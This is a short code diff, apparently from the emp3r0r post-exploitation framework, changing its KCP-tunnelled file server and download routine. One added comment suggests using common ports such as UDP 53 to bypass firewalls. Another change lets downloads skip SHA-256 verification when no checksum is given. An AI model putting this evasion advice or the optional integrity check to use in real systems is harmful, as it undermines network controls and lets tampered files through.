@@ -215,6 +215,8 @@ func FileServer(port int, ctx context.Context, cancel context.CancelFunc) (err e
 	server := &http.Server{Addr: listen_addr}
 
 	// start KCP tunnel server that forwards to HTTP server
+	// the KCP server will listen on user's specified port while the HTTP server listens on a random port
+	// common ports such as UDP 53 can be specified to bypass firewall
 	portstr := fmt.Sprintf("%d", port)
 	go tun.KCPTunServer(listen_addr, portstr, RuntimeConfig.Password, emp3r0r_data.MagicString, ctx, cancel)
 
@@ -286,8 +288,12 @@ func RequestAndDownloadFile(address, filepath, path, checksum string) (err error
 			if err != nil {
 				return fmt.Errorf("RequestAndDownloadFile: download finished with error: %v", err)
 			}
-			if checksum != tun.SHA256SumFile(path) {
-				return fmt.Errorf("RequestAndDownloadFile: checksum failed: %s != %s", tun.SHA256SumFile(path), checksum)
+
+			// if checksum is given, check it
+			if checksum != "" {
+				if checksum != tun.SHA256SumFile(path) {
+					return fmt.Errorf("RequestAndDownloadFile: checksum failed: %s != %s", tun.SHA256SumFile(path), checksum)
+				}
 			}
 			log.Printf("RequestAndDownloadFile: saved %s to %s (%d bytes)", filepath, path, resp.Size())
 			return nil
